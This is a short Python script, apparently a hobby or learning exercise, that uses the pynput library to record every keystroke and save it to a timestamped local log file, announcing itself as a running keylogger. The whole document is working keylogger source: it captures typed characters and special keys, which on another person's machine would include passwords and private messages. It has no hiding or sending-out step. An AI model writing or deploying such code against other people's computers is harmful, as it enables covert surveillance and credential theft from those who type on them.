from pynput import keyboard
import logging
from datetime import datetime

# Create a log file with timestamp
log_filename = f"key_log_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt"
logging.basicConfig(filename=log_filename, level=logging.DEBUG, format='%(asctime)s: %(message)s')

def on_press(key):
    try:
        logging.info(f"Key pressed: {key.char}")
    except AttributeError:
        logging.info(f"Special key pressed: {key}")

# Start listening
with keyboard.Listener(on_press=on_press) as listener:
    print(f"[✔] Keylogger running... Keystrokes will be saved to {log_filename}")
    listener.join()
